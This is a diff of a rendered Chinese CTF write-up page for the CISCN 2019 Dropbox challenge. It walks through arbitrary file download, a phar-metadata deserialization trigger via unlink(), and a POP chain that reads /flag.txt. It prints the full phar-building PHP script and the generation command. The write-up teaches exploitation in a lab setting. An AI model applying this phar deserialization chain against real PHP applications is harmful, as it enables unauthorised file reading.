+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="x">    $escape = '/' . implode('|', $escape) . '/';</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="x">    $string = preg_replace($escape, '_', $string);</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="x">    $safe = array('select', 'insert', 'update', 'delete', 'where');</span>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="x">    $safe = '/' . implode('|', $safe) . '/i';</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="x">    return preg_replace($safe, 'hacker', $string);</span>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="x">}</span>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="x">public function show_profile($username) {</span>
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="x">    $username = parent::filter($username);</span>
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="x">    $where = "username = '$username'";</span>
+</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="x">    $object = parent::select($this-&gt;table, $where);</span>
+</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="x">    return $object-&gt;profile;</span>
+</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="x">}</span>
+</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>
+</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a><span class="x">public function update_profile($username, $new_profile) {</span>
+</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="x">    $username = parent::filter($username);</span>
+</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a><span class="x">    $new_profile = parent::filter($new_profile);</span>
+</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a><span class="x">    ...</span>
+</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a><span class="x">}</span>
 </span></code></pre></div>
 </details>
     
@@ -4320,24 +4511,24 @@
 <p><strong>先随便传一张图片试试</strong> —— 传上去了，但是<strong>没有返回访问地址</strong>，访问不到。所以文件上传漏洞这条路走不通。</p>
 <h4 id="step-2"><a class="toclink" href="../../ciscn2019-dropbox-phar/#step-2">Step 2：下载和删除能干什么</a></h4>
 <p><strong>这两个功能的共同点是：都接收一个文件名参数。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>下载：给文件名，返回内容      → 想到「任意文件下载」
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>删除：给文件名，把它删掉
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>下载：给文件名，返回内容      → 想到「任意文件下载」
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>删除：给文件名，把它删掉
 </span></code></pre></div>
 <h4 id="step-3-burp"><a class="toclink" href="../../ciscn2019-dropbox-phar/#step-3-burp">Step 3：用 Burp 把源码一个一个抓下来</a></h4>
 <p><strong>借着「任意文件下载」，把用到的每个 php 都抓下来。</strong>我先抓了 5 个：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>download.php
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>index.php
-</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>login.php
-</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>delete.php
-</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>class.php        ← 在看完 index.php 之后发现的：它被 include 了
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>download.php
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>index.php
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>login.php
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>delete.php
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>class.php        ← 在看完 index.php 之后发现的：它被 include 了
 </span></code></pre></div>
 <p><strong><code>class.php</code> 是这里面最重要的一个。</strong></p>
 <h4 id="step-4classphp-flag"><a class="toclink" href="../../ciscn2019-dropbox-phar/#step-4classphp-flag">Step 4：<code>class.php</code> 里找能拿 flag 的语句</a></h4>
 <p><strong>找到了这一处：</strong></p>
 <p><img alt="File::close" src="../../../assets/images/ciscn2019-dropbox/01-file-close.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="x">public function close() {</span>
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="x">    return file_get_contents($this-&gt;filename);</span>
-</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="x">public function close() {</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="x">    return file_get_contents($this-&gt;filename);</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong><code>file_get_contents</code> 读的是 <code>$this-&gt;filename</code> —— 只要让这个属性等于 <code>/flag.txt</code>，<code>close()</code> 就能把 flag 读出来。</strong></p>
 <p><strong>但问题来了：整个站里没有 <code>unserialize()</code>，怎么让它执行？</strong></p>
@@ -4352,17 +4543,17 @@
 <h4 id="step-6downloadphp-deletephp"><a class="toclink" href="../../ciscn2019-dropbox-phar/#step-6downloadphp-deletephp">Step 6：<code>download.php</code> 不行，<code>delete.php</code> 行</a></h4>
 <p><strong>先看 <code>download.php</code>：</strong></p>
 <p><img alt="download.php" src="../../../assets/images/ciscn2019-dropbox/02-download-php.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="x">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, "flag") === false) {</span>
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="x">    ...</span>
-</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="x">    echo $file-&gt;close();</span>
-</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="x">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, "flag") === false) {</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="x">    ...</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="x">    echo $file-&gt;close();</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>它确实会调用 <code>close()</code>，但那个 <code>stristr($filename, "flag") === false</code> 把带 flag 的路径全过滤了 —— 走不通。</strong></p>
 <p><strong>再看 <code>delete.php</code>：</strong></p>
 <p><img alt="File::detele" src="../../../assets/images/ciscn2019-dropbox/03-file-delete.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="x">public function detele() {</span>
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="x">    unlink($this-&gt;filename);</span>
-</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="x">public function detele() {</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="x">    unlink($this-&gt;filename);</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong><code>unlink()</code> 正好在受影响函数列表里 —— 只要 <code>filename</code> 是 <code>phar://...</code>，调用 <code>unlink</code> 的那一刻就会触发反序列化。</strong></p>
 <p><strong>（注：方法名 <code>detele</code> 是原题作者拼错的，不是笔误。）</strong></p>
@@ -4370,97 +4561,97 @@
 <p><strong>目标是 <code>File::close()</code>。但它没有什么特殊的触发方式，所以要一层层往上找。</strong></p>
 <p><strong>先看 <code>FileList::__call</code>：</strong></p>
 <p><img alt="FileList::__call" src="../../../assets/images/ciscn2019-dropbox/04-filelist-call.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="x">public function __call($func, $args) {</span>
-</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="x">    array_push($this-&gt;funcs, $func);</span>
-</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="x">    foreach ($this-&gt;files as $file) {</span>
-</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="x">        $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span>
-</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="x">    }</span>
-</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="x">public function __call($func, $args) {</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="x">    array_push($this-&gt;funcs, $func);</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="x">    foreach ($this-&gt;files as $file) {</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="x">        $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="x">    }</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong><code>$file-&gt;$func()</code> 这一句是动态调用 —— 如果我们让 <code>$func = 'close'</code>，那 <code>$file-&gt;close()</code> 就被执行了。</strong></p>
 <p><strong>而 <code>__call</code> 的触发条件是：</strong>调用了一个不存在的方法<strong>。</strong></p>
 <p><strong>再往上看，<code>User::__destruct</code>：</strong></p>
 <p><img alt="User::__destruct" src="../../../assets/images/ciscn2019-dropbox/05-user-destruct.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="x">public function __destruct() {</span>
-</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="x">    $this-&gt;db-&gt;close();</span>
-</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="x">public function __destruct() {</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="x">    $this-&gt;db-&gt;close();</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong><code>$this-&gt;db</code> 是我们可以控制的属性。只要让它等于一个 <code>FileList</code> 对象，那么 <code>$this-&gt;db-&gt;close()</code> 就变成了「对 FileList 调用一个它没有的方法 <code>close</code>」→ 正好触发上面的 <code>__call</code>。</strong></p>
 <p><strong>整条链就接起来了：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>unlink(phar://...)            ← delete.php 里的 File::detele()
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>  ↓ 触发 phar 的 metadata 反序列化
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>User::__destruct()
-</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>  ↓  $this-&gt;db-&gt;close()
-</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>FileList::__call('close')
-</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>  ↓  foreach $files: $file-&gt;close()
-</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>File::close()
-</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>  ↓  file_get_contents('/flag.txt')
-</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>结果存进 $results
-</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>  ↓
-</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>FileList::__destruct()        ← 把 results 输出出来
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>unlink(phar://...)            ← delete.php 里的 File::detele()
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>  ↓ 触发 phar 的 metadata 反序列化
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>User::__destruct()
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>  ↓  $this-&gt;db-&gt;close()
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>FileList::__call('close')
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>  ↓  foreach $files: $file-&gt;close()
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>File::close()
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>  ↓  file_get_contents('/flag.txt')
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>结果存进 $results
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>  ↓
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>FileList::__destruct()        ← 把 results 输出出来
 </span></code></pre></div>
 <p><strong>这一步是我卡最久的地方：<code>file_get_contents</code> 读到了，但</strong>没有输出<strong>还是白搭。答案是 <code>FileList</code> 自己的 <code>__destruct</code> 会把 <code>$results</code> 打出来 —— 所以链的末端不是 <code>close</code>，而是「<code>close</code> 的结果被 <code>__destruct</code> 输出」。</strong></p>
 <h4 id="step-8-phar"><a class="toclink" href="../../ciscn2019-dropbox-phar/#step-8-phar">Step 8：构造 phar</a></h4>
 <p><img alt="class.php 与构造脚本" src="../../../assets/images/ciscn2019-dropbox/06-class-and-pop.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="x">class User {</span>
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="x">    public $db;</span>
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="x">}</span>
-</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="x">class File {</span>
-</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="x">    public $filename;</span>
-</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="x">}</span>
-</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="x">class FileList {</span>
-</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="x">    private $files;</span>
-</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a><span class="x">    private $results;</span>
-</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a><span class="x">    private $funcs;</span>
-</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a><span class="x">    public function __construct() {</span>
-</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a><span class="x">        $file = new File();</span>
-</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a><span class="x">        $file-&gt;filename = '/flag.txt';</span>
-</span><span id="__span-25-14"><a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a><span class="x">        $this-&gt;files = array($file);</span>
-</span><span id="__span-25-15"><a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a><span class="x">        $this-&gt;results = array();</span>
-</span><span id="__span-25-16"><a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a><span class="x">        $this-&gt;funcs = array();</span>
-</span><span id="__span-25-17"><a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a><span class="x">    }</span>
-</span><span id="__span-25-18"><a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a><span class="x">}</span>
-</span><span id="__span-25-19"><a id="__codelineno-25-19" name="__codelineno-25-19" href="#__codelineno-25-19"></a>
-</span><span id="__span-25-20"><a id="__codelineno-25-20" name="__codelineno-25-20" href="#__codelineno-25-20"></a><span class="x">$a = new User();</span>
-</span><span id="__span-25-21"><a id="__codelineno-25-21" name="__codelineno-25-21" href="#__codelineno-25-21"></a><span class="x">$a-&gt;db = new FileList();</span>
-</span><span id="__span-25-22"><a id="__codelineno-25-22" name="__codelineno-25-22" href="#__codelineno-25-22"></a><span class="x">$p = new Phar(__DIR__ . '/x.phar');</span>
-</span><span id="__span-25-23"><a id="__codelineno-25-23" name="__codelineno-25-23" href="#__codelineno-25-23"></a><span class="x">$p-&gt;startBuffering();</span>
-</span><span id="__span-25-24"><a id="__codelineno-25-24" name="__codelineno-25-24" href="#__codelineno-25-24"></a><span class="x">$p-&gt;addFromString('test.txt', 'x');</span>
-</span><span id="__span-25-25"><a id="__codelineno-25-25" name="__codelineno-25-25" href="#__codelineno-25-25"></a><span class="x">$p-&gt;setStub('</span><span class="cp">&lt;?php</span> <span class="nx">__HALT_COMPILER</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="x">');</span>
-</span><span id="__span-25-26"><a id="__codelineno-25-26" name="__codelineno-25-26" href="#__codelineno-25-26"></a><span class="x">$p-&gt;setMetadata($a);</span>
-</span><span id="__span-25-27"><a id="__codelineno-25-27" name="__codelineno-25-27" href="#__codelineno-25-27"></a><span class="x">$p-&gt;stopBuffering();</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="x">class User {</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="x">    public $db;</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="x">}</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="x">class File {</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="x">    public $filename;</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="x">}</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="x">class FileList {</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="x">    private $files;</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="x">    private $results;</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="x">    private $funcs;</span>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="x">    public function __construct() {</span>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="x">        $file = new File();</span>
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="x">        $file-&gt;filename = '/flag.txt';</span>
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="x">        $this-&gt;files = array($file);</span>
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a><span class="x">        $this-&gt;results = array();</span>
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a><span class="x">        $this-&gt;funcs = array();</span>
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a><span class="x">    }</span>
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a><span class="x">}</span>
+</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>
+</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a><span class="x">$a = new User();</span>
+</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a><span class="x">$a-&gt;db = new FileList();</span>
+</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a><span class="x">$p = new Phar(__DIR__ . '/x.phar');</span>
+</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a><span class="x">$p-&gt;startBuffering();</span>
+</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a><span class="x">$p-&gt;addFromString('test.txt', 'x');</span>
+</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a><span class="x">$p-&gt;setStub('</span><span class="cp">&lt;?php</span> <span class="nx">__HALT_COMPILER</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="x">');</span>
+</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a><span class="x">$p-&gt;setMetadata($a);</span>
+</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a><span class="x">$p-&gt;stopBuffering();</span>
 </span></code></pre></div>
 <p><strong>一个坑：<code>FileList</code> 的三个属性都是 <code>private</code>，而且是数组。<code>$results</code> 和 <code>$funcs</code> 其实用不到，但也要通过构造函数一起初始化 —— 否则 <code>__call</code> 里 <code>array_push</code> 一个 null 会报错。</strong></p>
 <h4 id="step-9"><a class="toclink" href="../../ciscn2019-dropbox-phar/#step-9">Step 9：生成、上传、触发</a></h4>
 <p><strong>生成：</strong></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">php</span> <span class="n">-d</span> <span class="n">phar</span><span class="p">.</span><span class="n">readonly</span><span class="p">=</span><span class="n">0</span> <span class="n">pop</span><span class="p">.</span><span class="n">php</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">php</span> <span class="n">-d</span> <span class="n">phar</span><span class="p">.</span><span class="n">readonly</span><span class="p">=</span><span class="n">0</span> <span class="n">pop</span><span class="p">.</span><span class="n">php</span>
 </span></code></pre></div>
 <p><strong>⚠️ 这里有两个坑：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>① 指令名是 phar.readonly，不是 phar.onlyread
-</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>   —— 拼错 PHP 不会报错，只会静默忽略，然后报
-</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>   "creating archive disabled by the php.ini setting phar.readonly"
-</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>
-</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>② 生成的 x.phar 可以随便改后缀（x.jpg / x.png 都行），
-</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>   phar 靠文件头识别，不靠扩展名
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>① 指令名是 phar.readonly，不是 phar.onlyread
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>   —— 拼错 PHP 不会报错，只会静默忽略，然后报
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>   "creating archive disabled by the php.ini setting phar.readonly"
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>② 生成的 x.phar 可以随便改后缀（x.jpg / x.png 都行），
